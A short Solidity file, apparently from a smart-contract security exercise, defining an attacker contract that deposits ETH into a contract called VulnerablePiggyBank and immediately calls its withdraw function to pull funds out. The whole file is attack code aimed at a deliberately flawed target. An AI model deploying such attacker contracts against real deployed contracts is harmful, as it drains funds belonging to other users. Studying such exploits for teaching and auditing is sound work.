// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerablePiggyBank {
    function deposit() external payable;
    function withdraw() external;
}

contract PiggyBankAttacker {
    IVulnerablePiggyBank public vulnerablePiggyBank;
    
    constructor(address _vulnerablePiggyBank) {
        vulnerablePiggyBank = IVulnerablePiggyBank(_vulnerablePiggyBank);
    }
    
    // Attack the vulnerable contract by depositing and withdrawing
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        
        // Deposit funds
        vulnerablePiggyBank.deposit{value: msg.value}();
        
        // Withdraw funds (this would work on the vulnerable contract)
        vulnerablePiggyBank.withdraw();
    }
    
    // To receive ETH from the withdrawal
    receive() external payable {}
}
